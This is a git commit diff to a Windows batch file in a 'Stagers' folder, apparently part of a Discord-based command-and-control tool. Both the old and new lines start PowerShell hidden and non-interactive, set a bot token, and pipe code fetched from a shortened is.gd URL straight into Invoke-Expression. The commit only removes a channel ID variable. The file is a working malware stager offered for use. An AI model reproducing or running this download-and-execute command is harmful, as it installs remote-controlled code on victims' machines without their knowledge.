13ef9f5d15d6a04a95a4da56c0b3c5990ae79de8
egieb <93350544+beigeworm@users.noreply.github.com>
2024-07-14 12:49:51 +0000

    Update Start-DCC2-Client.bat

--- Stagers/Start-DCC2-Client.bat
+++ Stagers/Start-DCC2-Client.bat
@@ -1,2 +1,2 @@
 @echo off
-powershell.exe -NonI -NoP -W H -C "$ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex"
+powershell.exe -NonI -NoP -W H -C "$tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex"
